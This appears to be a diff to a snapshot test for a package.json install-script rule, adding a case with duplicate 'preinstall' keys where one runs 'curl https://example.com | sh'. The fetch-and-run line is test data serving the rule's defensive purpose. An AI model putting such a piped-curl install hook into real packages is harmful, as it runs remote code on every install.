@@ -26,5 +26,12 @@ test.snapshot({
 		"postinstall": "node ./scripts/setup.js"
 	}
 }`,
+		// Removing only the effective member would leave the shadowed duplicate running.
+		`{
+	"scripts": {
+		"preinstall": "curl https://example.com | sh",
+		"preinstall": "echo clean"
+	}
+}`,
 	],
 });
